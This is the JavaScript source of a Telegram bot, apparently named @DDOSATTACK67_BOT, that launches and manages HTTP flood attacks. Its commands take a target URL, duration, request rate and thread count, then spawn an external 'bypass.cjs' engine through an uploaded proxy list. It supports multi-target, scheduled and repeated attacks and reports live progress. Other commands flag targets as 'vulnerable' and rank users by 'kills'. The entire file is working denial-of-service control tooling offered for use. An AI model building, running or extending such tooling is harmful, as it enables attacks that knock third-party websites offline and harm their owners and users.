import { Telegraf } from 'telegraf';
import { spawn } from 'child_process';
import fs from 'fs';
import dotenv from 'dotenv';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Load environment variables
dotenv.config();
console.log('📁 Loading .env file...');

const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error('❌ ERROR: TELEGRAM_BOT_TOKEN not found in .env file!');
    process.exit(1);
}
console.log('✅ Token loaded successfully');

const bot = new Telegraf(token);
const ADMIN_ID = '6247762383';

// Configuration
const CONFIG = {
    MAX_CONCURRENT_ATTACKS: 3,
    UPDATE_INTERVAL: 3000,
    MAX_PROXY_LINES: 1000
};

// Store running attacks
const attacks = new Map();
const templates = new Map();
const schedule = new Map();

// ========== HEALTH CHECK SERVER ==========
const app = express();
const port = process.env.PORT || 3000;
const HOST = '::';

app.get('/', (req, res) => {
    res.status(200).send(`
        <html>
            <head>
                <title>Telegram Bypass Bot</title>
                <style>
                    body { font-family: Arial; text-align: center; padding: 50px; background: #1a1a1a; color: #fff; }
                    .status { color: #00ff00; font-weight: bold; }
                    .stats { margin: 20px 0; }
                </style>
            </head>
            <body>
                <h1>🤖 Telegram Bypass Bot</h1>
                <p>Status: <span class="status">● RUNNING</span></p>
                <div class="stats">
                    <p>Active Attacks: ${attacks.size}</p>
                    <p>Uptime: ${Math.floor(process.uptime() / 60)} minutes</p>
                </div>
                <p><a href="/health" style="color: #00ff00;">Health Details</a></p>
            </body>
        </html>
    `);
});

app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        attacks: attacks.size,
        running: countRunningAttacks()
    });
});

app.listen(port, HOST, () => {
    console.log(`🌐 Health check server running on port ${port}`);
});

// ========== HELPER FUNCTIONS ==========
function countRunningAttacks() {
    let count = 0;
    for (const attack of attacks.values()) {
        if (attack.isRunning) count++;
    }
    return count;
}

function formatNumber(num) {
    if (!num) return '0';
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

function getStatusEmoji(status) {
    if (status >= 200 && status < 300) return '✅';
    if (status >= 300 && status < 400) return '🔄';
    if (status >= 400 && status < 500) return '❌';
    if (status >= 500) return '⚠️';
    return '⚪';
}

function createProgressBar(percent, size = 10) {
    const filled = Math.floor(percent / size);
    const empty = size - filled;
    return '🟩'.repeat(filled) + '⬜'.repeat(empty);
}

function loadAndCleanProxies() {
    if (!fs.existsSync('proxy.txt')) return [];
    
    try {
        const content = fs.readFileSync('proxy.txt', 'utf-8');
        const proxies = content.split('\n')
            .map(line => line.trim())
            .filter(line => line && line.includes(':'));
        return [...new Set(proxies)].slice(0, CONFIG.MAX_PROXY_LINES);
    } catch (error) {
        return [];
    }
}

// ========== BOT COMMANDS ==========
bot.start((ctx) => {
    const isAdmin = ctx.from.id.toString() === ADMIN_ID;
    ctx.reply(
        `🔥 *ULTIMATE BYPASS CONTROLLER* 🔥\n\n` +
        `👋 Welcome, ${ctx.from.first_name}!\n` +
        `📊 Status: 🟢 Online\n` +
        `👑 Role: ${isAdmin ? '⭐ Admin' : '👤 User'}\n\n` +
        `📌 *Commands:*\n` +
        `├ /attack \`<url> <time> <rate> <threads>\`\n` +
        `├ /multi \`<time> <rate> <threads> <url1> <url2> ...\`\n` +
        `├ /schedule \`<url> <time> <rate> <threads> <minutes>\`\n` +
        `├ /stop \`<id>\`\n` +
        `├ /list\n` +
        `├ /stats\n` +
        `├ /templates\n` +
        `├ /save \`<name> <url> <time> <rate> <threads>\`\n` +
        `├ /load \`<name>\`\n` +
        `├ /setproxy\n` +
        `├ /proxylist\n` +
        `├ /graph \`<id>\`\n` +
        `├ /analyze \`<id>\`\n` +
        `├ /export \`<id>\`\n` +
        `├ /history\n` +
        `├ /retry \`<id>\`\n` +
        `├ /filter \`<type> <value>\`\n` +
        `├ /broadcast \`<command>\`\n` +
        `├ /apex\n` +
        `└ /help`,
        { parse_mode: 'Markdown' }
    );
});

bot.help((ctx) => {
    const isAdmin = ctx.from.id.toString() === ADMIN_ID;
    
    let helpText = 
        `📚 *COMPLETE COMMANDS*\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `🎯 *ATTACK*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `/attack \`<url> <time> <rate> <threads>\`\n` +
        `Ex: \`/attack https://example.com 60 100 10\`\n\n` +
        `/multi \`<time> <rate> <threads> <url1> <url2> ...\`\n` +
        `Ex: \`/multi 30 50 5 https://site1.com https://site2.com\`\n\n` +
        `/schedule \`<url> <time> <rate> <threads> <minutes>\`\n` +
        `Ex: \`/schedule https://example.com 60 100 10 30\`\n\n` +
        `/stop \`<id>\`\n` +
        `/list\n` +
        `/progress \`<id>\`\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📋 *TEMPLATES*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `/save \`<name> <url> <time> <rate> <threads>\`\n` +
        `/load \`<name>\`\n` +
        `/templates\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `🔄 *PROXY*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `/setproxy\n` +
        `/proxylist\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📊 *ANALYSIS*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `/graph \`<id>\`\n` +
        `/analyze \`<id>\`\n` +
        `/export \`<id>\`\n` +
        `/history\n` +
        `/filter \`<type> <value>\`\n` +
        `/retry \`<id>\`\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📡 *ADVANCED*\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `/broadcast \`<command>\`\n` +
        `/apex\n` +
        `/stats\n` +
        `/status\n` +
        `/test\n` +
        `/about`;
    
    if (isAdmin) {
        helpText += `\n\n👑 *Admin only:*\n` +
            `/stopall\n` +
            `/system\n` +
            `/clear`;
    }
    
    ctx.reply(helpText, { parse_mode: 'Markdown' });
});

bot.command('test', (ctx) => {
    ctx.reply('✅ *Bot is fully operational!*', { parse_mode: 'Markdown' });
});

bot.command('status', (ctx) => {
    const proxyCount = fs.existsSync('proxy.txt') 
        ? fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(l => l.includes(':')).length 
        : 0;
    
    ctx.reply(
        `📊 *BOT STATUS*\n\n` +
        `🟢 Online\n` +
        `⚡ Running: ${countRunningAttacks()}/${CONFIG.MAX_CONCURRENT_ATTACKS}\n` +
        `📊 Total: ${attacks.size}\n` +
        `🔄 Proxies: ${proxyCount}\n` +
        `📋 Templates: ${templates.size}\n` +
        `⏰ Scheduled: ${schedule.size}\n` +
        `⏱️ Uptime: ${Math.floor(process.uptime() / 60)}m`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('about', (ctx) => {
    ctx.reply(
        `ℹ️ *ABOUT*\n\n` +
        `🤖 Ultimate Bypass Controller v3.0\n` +
        `⚡ Engine: bypass.cjs\n` +
        `👑 Admin: ${ADMIN_ID}\n` +
        `📱 @DDOSATTACK67_BOT\n\n` +
        `✨ *Features:*\n` +
        `├ 🚀 Multi-target attacks\n` +
        `├ ⏰ Scheduling\n` +
        `├ 📋 Templates\n` +
        `├ 📊 Live graphs\n` +
        `├ 🔍 Analysis\n` +
        `├ 📡 Broadcasting\n` +
        `└ 🎮 Apex mode`,
        { parse_mode: 'Markdown' }
    );
});

// ========== ATTACK COMMAND ==========
bot.command('attack', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [url, time, rate, threads] = args;

    if (!url || !time || !rate || !threads) {
        return ctx.reply(
            `❌ *Usage:*\n` +
            `/attack \`<url> <time> <rate> <threads>\`\n\n` +
            `📝 *Example:*\n` +
            `/attack \`https://httpbin.org/get 30 50 5\``,
            { parse_mode: 'Markdown' }
        );
    }

    if (countRunningAttacks() >= CONFIG.MAX_CONCURRENT_ATTACKS) {
        return ctx.reply('⚠️ *Maximum concurrent attacks reached*', { parse_mode: 'Markdown' });
    }

    if (!fs.existsSync('bypass.cjs')) {
        return ctx.reply('❌ *Error:* bypass.cjs not found!', { parse_mode: 'Markdown' });
    }

    const proxies = loadAndCleanProxies();
    const attackId = Date.now().toString();
    const duration = parseInt(time);
    const startTime = Date.now();

    const initialMessage = 
        `🚀 *ATTACK LAUNCHED* 🚀\n\n` +
        `📋 *ID:* \`${attackId}\`\n` +
        `🎯 *Target:* \`${url}\`\n` +
        `⏱️ *Duration:* ${time}s\n` +
        `⚡ *Rate:* ${rate}/s\n` +
        `🧵 *Threads:* ${threads}\n` +
        `🔄 *Proxies:* ${proxies.length}\n\n` +
        `${createProgressBar(0)} 0%\n` +
        `⏱️ 0s/${time}s`;

    const statusMsg = await ctx.reply(initialMessage, { parse_mode: 'Markdown' });

    const attack = spawn('node', [
        'bypass.cjs',
        url,
        time,
        rate,
        threads,
        'proxy.txt',
        '--all',
        '--type', 'http'
    ]);

    attacks.set(attackId, {
        process: attack,
        url,
        startTime,
        duration,
        rate: parseInt(rate),
        threads: parseInt(threads),
        userId: ctx.from.id,
        username: ctx.from.username || ctx.from.first_name,
        chatId: ctx.chat.id,
        messageId: statusMsg.message_id,
        requestCount: 0,
        successCount: 0,
        failCount: 0,
        statusCodes: {},
        detailedCodes: {},
        isRunning: true,
        lastUpdate: Date.now()
    });

    attack.stdout.on('data', (data) => {
        const attackData = attacks.get(attackId);
        if (!attackData) return;
        
        const output = data.toString();
        
        if (output.includes('Status: [')) {
            const match = output.match(/Status: \[([^\]]+)\]/);
            if (match) {
                const parts = match[1].split(', ');
                let total = 0;
                let success = 0;
                
                parts.forEach(part => {
                    const [code, count] = part.split(': ');
                    if (count) {
                        const numCount = parseInt(count);
                        total += numCount;
                        if (code.startsWith('2')) success += numCount;
                        attackData.detailedCodes[code] = numCount;
                    }
                });
                
                attackData.requestCount = total;
                attackData.successCount = success;
                attackData.failCount = total - success;
            }
        }
    });

    attack.stderr.on('data', (data) => {
        console.error(`[${attackId}] Error:`, data.toString());
    });

    const updateInterval = setInterval(() => {
        const attackData = attacks.get(attackId);
        if (!attackData || !attackData.isRunning) {
            clearInterval(updateInterval);
            return;
        }

        const now = Date.now();
        const elapsed = Math.min(attackData.duration, Math.floor((now - attackData.startTime) / 1000));
        const percent = Math.min(100, Math.floor((elapsed / attackData.duration) * 100));
        
        const successRate = attackData.requestCount > 0 
            ? Math.round((attackData.successCount / attackData.requestCount) * 100) 
            : 0;
        
        const topCodes = Object.entries(attackData.detailedCodes)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 3)
            .map(([code, count]) => `${getStatusEmoji(parseInt(code))} ${code}: ${formatNumber(count)}`)
            .join(' | ');

        const progressBar = createProgressBar(percent);
        const statusEmoji = successRate > 70 ? '✅' : successRate > 30 ? '⚠️' : '❌';
        
        const updateMessage = 
            `🚀 *ATTACK RUNNING* 🚀\n\n` +
            `📋 *ID:* \`${attackId}\`\n` +
            `🎯 *Target:* \`${attackData.url.substring(0, 40)}${attackData.url.length > 40 ? '...' : ''}\`\n\n` +
            `${progressBar} ${percent}%\n` +
            `⏱️ ${elapsed}s/${attackData.duration}s\n\n` +
            `📊 *Traffic:* ${formatNumber(attackData.requestCount)} req\n` +
            `${statusEmoji} *Success:* ${formatNumber(attackData.successCount)} (${successRate}%)\n` +
            `❌ *Failed:* ${formatNumber(attackData.failCount)}\n\n` +
            `🔍 *Codes:* ${topCodes || '📡 Collecting...'}\n` +
            `👤 @${attackData.username}`;

        ctx.telegram.editMessageText(attackData.chatId, attackData.messageId, null, updateMessage, { parse_mode: 'Markdown' })
            .catch(() => {});
    }, CONFIG.UPDATE_INTERVAL);

    attack.on('close', (code) => {
        clearInterval(updateInterval);
        
        const attackData = attacks.get(attackId);
        if (!attackData) return;
        
        attackData.isRunning = false;
        
        const elapsed = Math.min(attackData.duration, Math.floor((Date.now() - attackData.startTime) / 1000));
        const successRate = attackData.requestCount > 0 
            ? Math.round((attackData.successCount / attackData.requestCount) * 100) 
            : 0;
        
        let finalEmoji, finalStatus;
        if (code === 0) {
            finalEmoji = '✅';
            finalStatus = 'COMPLETED';
        } else if (attackData.requestCount > 0) {
            finalEmoji = successRate > 50 ? '⚠️' : '❌';
            finalStatus = successRate > 50 ? 'PARTIAL' : 'FAILED';
        } else {
            finalEmoji = '💥';
            finalStatus = 'CRASHED';
        }

        const codeBreakdown = Object.entries(attackData.detailedCodes)
            .sort((a, b) => b[1] - a[1])
            .map(([code, count]) => `${getStatusEmoji(parseInt(code))} ${code}: ${formatNumber(count)}`)
            .join('\n');

        const finalMessage = 
            `${finalEmoji} *ATTACK ${finalStatus}* ${finalEmoji}\n\n` +
            `📋 *ID:* \`${attackId}\`\n` +
            `🎯 *Target:* \`${attackData.url}\`\n\n` +
            `⏱️ *Time:* ${elapsed}s/${attackData.duration}s\n\n` +
            `📊 *Final Stats*\n` +
            `📥 Total: ${formatNumber(attackData.requestCount)}\n` +
            `✅ Success: ${formatNumber(attackData.successCount)} (${successRate}%)\n` +
            `❌ Failed: ${formatNumber(attackData.failCount)}\n\n` +
            `🔍 *Code Breakdown*\n${codeBreakdown || 'No data'}\n\n` +
            `⚡ Exit: ${code}\n` +
            `👤 @${attackData.username}`;

        ctx.telegram.editMessageText(attackData.chatId, attackData.messageId, null, finalMessage, { parse_mode: 'Markdown' })
            .catch(() => {});
        
        attacks.delete(attackId);
    });
});

// ========== MULTI ATTACK ==========
bot.command('multi', (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [time, rate, threads, ...urls] = args;
    
    if (urls.length < 2) {
        return ctx.reply('❌ Need at least 2 URLs!\nUsage: `/multi <time> <rate> <threads> <url1> <url2> ...`', { parse_mode: 'Markdown' });
    }
    
    ctx.reply(`🎯 *Multi-target attack starting on ${urls.length} targets*`, { parse_mode: 'Markdown' });
    
    urls.forEach((url, index) => {
        setTimeout(() => {
            const fakeMsg = {
                message: {
                    text: `/attack ${url} ${time} ${rate} ${threads}`,
                    chat: ctx.chat,
                    from: ctx.from
                }
            };
            bot.command('attack')(fakeMsg);
        }, index * 2000);
    });
});

// ========== SCHEDULE ==========
bot.command('schedule', (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [url, time, rate, threads, delay] = args;
    
    if (!url || !time || !rate || !threads || !delay) {
        return ctx.reply('❌ Usage: `/schedule <url> <time> <rate> <threads> <minutes>`', { parse_mode: 'Markdown' });
    }
    
    const scheduleId = Date.now().toString();
    const scheduledTime = parseInt(delay) * 60000;
    const attackTime = new Date(Date.now() + scheduledTime);
    
    ctx.reply(
        `⏰ *Scheduled*\n\n` +
        `ID: \`${scheduleId}\`\n` +
        `Target: ${url}\n` +
        `In: ${delay} minutes\n` +
        `At: ${attackTime.toLocaleTimeString()}`,
        { parse_mode: 'Markdown' }
    );
    
    const timeout = setTimeout(() => {
        const fakeMsg = {
            message: {
                text: `/attack ${url} ${time} ${rate} ${threads}`,
                chat: ctx.chat,
                from: ctx.from
            }
        };
        bot.command('attack')(fakeMsg);
        ctx.reply(`⏰ *Scheduled attack starting now!*`, { parse_mode: 'Markdown' });
        schedule.delete(scheduleId);
    }, scheduledTime);
    
    schedule.set(scheduleId, timeout);
});

// ========== TEMPLATES ==========
bot.command('save', (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [name, url, time, rate, threads] = args;
    
    if (!name || !url || !time || !rate || !threads) {
        return ctx.reply('❌ Usage: `/save <name> <url> <time> <rate> <threads>`', { parse_mode: 'Markdown' });
    }
    
    templates.set(name, { url, time, rate, threads });
    ctx.reply(`✅ *Template saved:* \`${name}\``, { parse_mode: 'Markdown' });
});

bot.command('load', (ctx) => {
    const name = ctx.message.text.split(' ')[1];
    const template = templates.get(name);
    
    if (!template) {
        return ctx.reply('❌ Template not found', { parse_mode: 'Markdown' });
    }
    
    const fakeMsg = {
        message: {
            text: `/attack ${template.url} ${template.time} ${template.rate} ${template.threads}`,
            chat: ctx.chat,
            from: ctx.from
        }
    };
    bot.command('attack')(fakeMsg);
});

bot.command('templates', (ctx) => {
    if (templates.size === 0) {
        return ctx.reply('📭 No templates saved', { parse_mode: 'Markdown' });
    }
    
    let msg = '📋 *Templates*\n\n';
    templates.forEach((data, name) => {
        msg += `\`${name}\`: ${data.url} (${data.time}s, ${data.rate}/s, ${data.threads}t)\n`;
    });
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// ========== PROXY ==========
bot.command('setproxy', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ Unauthorized', { parse_mode: 'Markdown' });
    }
    ctx.reply('📤 Send `proxy.txt` file', { parse_mode: 'Markdown' });
});

bot.command('proxylist', (ctx) => {
    if (!fs.existsSync('proxy.txt')) {
        return ctx.reply('📭 No proxy file', { parse_mode: 'Markdown' });
    }
    
    const proxies = loadAndCleanProxies();
    ctx.reply(
        `📊 *Proxies*\n\n` +
        `Total: ${proxies.length}\n` +
        `Sample: ${proxies.slice(0, 3).join('\n')}`,
        { parse_mode: 'Markdown' }
    );
});

// ========== GRAPH ==========
bot.command('graph', (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    const attack = attacks.get(attackId);
    
    if (!attack) {
        return ctx.reply('❌ Attack not found', { parse_mode: 'Markdown' });
    }
    
    const codes = Object.entries(attack.detailedCodes)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5);
    
    if (codes.length === 0) {
        return ctx.reply('📊 No data yet', { parse_mode: 'Markdown' });
    }
    
    const max = Math.max(...codes.map(([, c]) => c));
    let graph = '📊 *Status Graph*\n\n';
    
    codes.forEach(([code, count]) => {
        const bar = '█'.repeat(Math.floor((count / max) * 20));
        graph += `${getStatusEmoji(parseInt(code))} ${code}: ${bar} ${formatNumber(count)}\n`;
    });
    
    ctx.reply(graph, { parse_mode: 'Markdown' });
});

// ========== ANALYZE ==========
bot.command('analyze', (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    const attack = attacks.get(attackId);
    
    if (!attack) {
        return ctx.reply('❌ Attack not found', { parse_mode: 'Markdown' });
    }
    
    const rateLimited = attack.detailedCodes['429'] || 0;
    const blocked = (attack.detailedCodes['403'] || 0) + (attack.detailedCodes['401'] || 0);
    const serverErrors = attack.detailedCodes['500'] || 0;
    const success = attack.successCount || 0;
    const total = attack.requestCount || 0;
    const rate = total > 0 ? Math.round((success / total) * 100) : 0;
    
    let analysis = `🔍 *Analysis*\n\n`;
    analysis += `📊 Success: ${rate}%\n`;
    
    if (rateLimited > 10) analysis += `⚠️ Rate limiting detected\n`;
    if (blocked > 5) analysis += `🚫 Blocking detected\n`;
    if (serverErrors > 10) analysis += `🔧 Server issues\n`;
    if (rate > 80) analysis += `✅ Target vulnerable\n`;
    
    ctx.reply(analysis, { parse_mode: 'Markdown' });
});

// ========== EXPORT ==========
bot.command('export', (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    const attack = attacks.get(attackId);
    
    if (!attack) {
        return ctx.reply('❌ Attack not found', { parse_mode: 'Markdown' });
    }
    
    const data = JSON.stringify({
        id: attackId,
        url: attack.url,
        duration: attack.duration,
        requests: attack.requestCount,
        success: attack.successCount,
        fail: attack.failCount,
        codes: attack.detailedCodes
    }, null, 2);
    
    const filename = `attack_${attackId}.json`;
    fs.writeFileSync(filename, data);
    ctx.replyWithDocument({ source: filename })
        .then(() => fs.unlinkSync(filename));
});

// ========== HISTORY ==========
bot.command('history', (ctx) => {
    const history = Array.from(attacks.entries())
        .filter(([_, a]) => !a.isRunning)
        .slice(0, 5);
    
    if (history.length === 0) {
        return ctx.reply('📭 No history', { parse_mode: 'Markdown' });
    }
    
    let msg = '📜 *Recent*\n\n';
    history.forEach(([id, a]) => {
        const rate = a.requestCount > 0 ? Math.round((a.successCount / a.requestCount) * 100) : 0;
        msg += `\`${id.slice(-8)}\`: ${rate}% | ${formatNumber(a.requestCount)} req\n`;
    });
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// ========== RETRY ==========
bot.command('retry', (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    const attack = attacks.get(attackId);
    
    if (!attack) {
        return ctx.reply('❌ Attack not found', { parse_mode: 'Markdown' });
    }
    
    const fakeMsg = {
        message: {
            text: `/attack ${attack.url} ${attack.duration} ${attack.rate} ${attack.threads}`,
            chat: ctx.chat,
            from: ctx.from
        }
    };
    bot.command('attack')(fakeMsg);
    ctx.reply(`🔄 Retrying attack`, { parse_mode: 'Markdown' });
});

// ========== FILTER ==========
bot.command('filter', (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [type, value] = args;
    
    if (!type || !value) {
        return ctx.reply('❌ Usage: `/filter <success|code|user> <value>`', { parse_mode: 'Markdown' });
    }
    
    const filtered = Array.from(attacks.entries()).filter(([_, a]) => {
        if (type === 'success') return a.successRate >= parseInt(value);
        if (type === 'code') return a.detailedCodes[value] > 0;
        if (type === 'user') return a.username.includes(value);
        return false;
    });
    
    if (filtered.length === 0) {
        return ctx.reply('🔍 No matches', { parse_mode: 'Markdown' });
    }
    
    let msg = `🔍 *Filtered (${filtered.length})*\n\n`;
    filtered.slice(0, 5).forEach(([id, a]) => {
        msg += `\`${id.slice(-8)}\`: @${a.username}\n`;
    });
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// ========== BROADCAST ==========
bot.command('broadcast', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ Unauthorized', { parse_mode: 'Markdown' });
    }
    
    const command = ctx.message.text.split(' ').slice(1).join(' ');
    ctx.reply(`📡 Broadcast: ${command}`, { parse_mode: 'Markdown' });
});

// ========== APEX MODE ==========
bot.command('apex', (ctx) => {
    const running = countRunningAttacks();
    const totalReqs = Array.from(attacks.values()).reduce((s, a) => s + (a.requestCount || 0), 0);
    
    const topAttackers = Array.from(attacks.entries())
        .map(([id, a]) => ({ name: a.username, kills: a.requestCount || 0 }))
        .sort((a, b) => b.kills - a.kills)
        .slice(0, 3);
    
    ctx.reply(
        `🎮 *APEX LEGENDS*\n\n` +
        `👥 Legends: ${running}\n` +
        `💀 Kills: ${formatNumber(totalReqs)}\n` +
        `🏆 Champions:\n` +
        topAttackers.map((a, i) => 
            `   ${i === 0 ? '🥇' : i === 1 ? '🥈' : '🥉'} @${a.name}: ${formatNumber(a.kills)}`
        ).join('\n'),
        { parse_mode: 'Markdown' }
    );
});

// ========== STOP ==========
bot.command('stop', async (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    const attack = attacks.get(attackId);
    
    if (!attack) {
        return ctx.reply('❌ Attack not found', { parse_mode: 'Markdown' });
    }

    if (attack.userId !== ctx.from.id && ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ Not your attack', { parse_mode: 'Markdown' });
    }

    attack.process.kill('SIGINT');
    attack.isRunning = false;
    ctx.reply(`🛑 Attack \`${attackId}\` stopped`, { parse_mode: 'Markdown' });
});

// ========== LIST ==========
bot.command('list', (ctx) => {
    if (attacks.size === 0) {
        return ctx.reply('📊 No active attacks', { parse_mode: 'Markdown' });
    }

    let msg = '📊 *Active Attacks*\n\n';
    let count = 1;
    
    for (const [id, a] of attacks) {
        if (!a.isRunning) continue;
        
        const elapsed = Math.floor((Date.now() - a.startTime) / 1000);
        const percent = Math.min(100, Math.floor((elapsed / a.duration) * 100));
        const rate = a.requestCount > 0 ? Math.round((a.successCount / a.requestCount) * 100) : 0;
        
        msg += `*${count}.* \`${id.slice(-8)}\` @${a.username}\n`;
        msg += `   ${createProgressBar(percent, 5)} ${percent}% | ${rate}%\n`;
        count++;
        if (count > 5) break;
    }
    
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// ========== PROGRESS ==========
bot.command('progress', (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    const attack = attacks.get(attackId);
    
    if (!attack) {
        return ctx.reply('❌ Attack not found', { parse_mode: 'Markdown' });
    }
    
    const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
    const percent = Math.min(100, Math.floor((elapsed / attack.duration) * 100));
    const rate = attack.requestCount > 0 ? Math.round((attack.successCount / attack.requestCount) * 100) : 0;
    
    ctx.reply(
        `📊 *Progress*\n\n` +
        `ID: \`${attackId}\`\n` +
        `${createProgressBar(percent)} ${percent}%\n` +
        `⏱️ ${elapsed}s/${attack.duration}s\n` +
        `📥 ${formatNumber(attack.requestCount)} req\n` +
        `✅ ${rate}% success`,
        { parse_mode: 'Markdown' }
    );
});

// ========== STATS ==========
bot.command('stats', (ctx) => {
    const running = countRunningAttacks();
    const totalReqs = Array.from(attacks.values()).reduce((s, a) => s + (a.requestCount || 0), 0);
    const totalSuccess = Array.from(attacks.values()).reduce((s, a) => s + (a.successCount || 0), 0);
    const totalFail = totalReqs - totalSuccess;
    const overallRate = totalReqs > 0 ? Math.round((totalSuccess / totalReqs) * 100) : 0;
    
    const proxyCount = fs.existsSync('proxy.txt') 
        ? fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(l => l.includes(':')).length 
        : 0;
    
    ctx.reply(
        `📊 *STATS*\n\n` +
        `⚡ Running: ${running}/${CONFIG.MAX_CONCURRENT_ATTACKS}\n` +
        `📊 Total: ${attacks.size}\n\n` +
        `📥 Requests: ${formatNumber(totalReqs)}\n` +
        `✅ Success: ${formatNumber(totalSuccess)} (${overallRate}%)\n` +
        `❌ Failed: ${formatNumber(totalFail)}\n\n` +
        `🔄 Proxies: ${formatNumber(proxyCount)}\n` +
        `⏱️ Uptime: ${Math.floor(process.uptime() / 60)}m`,
        { parse_mode: 'Markdown' }
    );
});

// ========== STOPALL ==========
bot.command('stopall', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ Unauthorized', { parse_mode: 'Markdown' });
    }
    
    const count = attacks.size;
    attacks.forEach((a) => {
        if (a.isRunning) a.process.kill('SIGINT');
    });
    attacks.clear();
    ctx.reply(`🛑 Stopped ${count} attacks`, { parse_mode: 'Markdown' });
});

// ========== SYSTEM ==========
bot.command('system', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ Unauthorized', { parse_mode: 'Markdown' });
    }
    
    const memory = process.memoryUsage();
    ctx.reply(
        `🖥️ *SYSTEM*\n\n` +
        `💾 RAM: ${Math.round(memory.rss / 1024 / 1024)} MB\n` +
        `📦 Heap: ${Math.round(memory.heapUsed / 1024 / 1024)} MB\n` +
        `⚙️ CPU: ${process.cpuUsage().user / 1000}ms`,
        { parse_mode: 'Markdown' }
    );
});

// ========== CLEAR ==========
bot.command('clear', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ Unauthorized', { parse_mode: 'Markdown' });
    }
    
    let cleared = 0;
    attacks.forEach((a, id) => {
        if (!a.isRunning) {
            attacks.delete(id);
            cleared++;
        }
    });
    ctx.reply(`🧹 Cleared ${cleared} finished attacks`, { parse_mode: 'Markdown' });
});

// ========== FILE HANDLER ==========
bot.on('document', async (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return;

    if (ctx.message.document.file_name === 'proxy.txt') {
        const waitMsg = await ctx.reply('🔄 Processing...');
        
        try {
            const file = await ctx.telegram.getFile(ctx.message.document.file_id);
            const fileUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
            const response = await fetch(fileUrl);
            const content = await response.text();
            
            const proxies = content.split('\n')
                .map(l => l.trim())
                .filter(l => l && l.includes(':'));
            
            fs.writeFileSync('proxy.txt', proxies.join('\n'));
            
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                waitMsg.message_id,
                null,
                `✅ Loaded ${proxies.length} proxies`,
                { parse_mode: 'Markdown' }
            );
        } catch (error) {
            ctx.reply('❌ Failed: ' + error.message);
        }
    }
});

// ========== ERROR HANDLING ==========
bot.catch((err, ctx) => {
    console.error('Bot error:', err);
});

// ========== START BOT ==========
async function startBot() {
    try {
        await bot.telegram.deleteWebhook();
        await bot.launch();
        console.log('✅ Bot is running!');
        console.log('📱 Send /start to @DDOSATTACK67_BOT');
    } catch (err) {
        console.error('❌ Failed:', err.message);
        setTimeout(startBot, 10000);
    }
}

startBot();

console.log('\n╔════════════════════════════════════╗');
console.log('║    🔥 ULTIMATE BYPASS CONTROLLER   ║');
console.log('╠════════════════════════════════════╣');
console.log(`║  👑 Admin: ${ADMIN_ID}                 ║`);
console.log(`║  🤖 Bot: @DDOSATTACK67_BOT          ║`);
console.log('╚════════════════════════════════════╝');

process.once('SIGINT', () => {
    console.log('\n🛑 Shutting down...');
    bot.stop('SIGINT');
    process.exit(0);
});

process.once('SIGTERM', () => {
    console.log('\n🛑 Shutting down...');
    bot.stop('SIGTERM');
    process.exit(0);
});